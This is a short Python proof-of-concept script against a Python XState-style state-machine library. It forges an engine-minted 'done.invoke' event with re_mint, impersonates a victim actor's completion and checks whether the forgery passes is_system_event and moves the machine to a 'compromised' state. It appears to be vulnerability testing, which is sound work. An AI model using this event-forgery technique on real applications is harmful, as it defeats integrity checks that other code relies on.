import sys, asyncio
sys.path.insert(0,"C:/Users/basil/AppData/Local/Temp/xsm091")
from xstate_statemachine import create_machine, Interpreter
from xstate_statemachine.events import re_mint, is_system_event

config = {
    "id": "victimtest",
    "initial": "waiting",
    "states": {
        "waiting": {
            "on": {"done.invoke.victim": "compromised"}
        },
        "compromised": {"type": "final"},
    },
}

async def main():
    machine = create_machine(config, logic=None)
    interp = Interpreter(machine)
    await interp.start()
    # Attacker doesn't control victim's actor, but can obtain SOME engine-minted
    # DoneEvent of their own (e.g. from a benign invoked actor they own) and
    # re_mint its type field to impersonate the victim's completion event.
    genuine = None
    # simulate obtaining an engine-minted event via internal factory (as if from own actor)
    from xstate_statemachine.events import _engine_done
    genuine = _engine_done("done.invoke.attacker_actor", {"pwned": True}, "attacker_actor")
    print("genuine is_system_event:", is_system_event(genuine))
    forged = re_mint(genuine, type="done.invoke.victim")
    print("forged type:", forged.type, "is_system_event:", is_system_event(forged))
    await interp.send(forged)
    await asyncio.sleep(0.05)
    print("current state:", interp.current_state_ids)

asyncio.run(main())
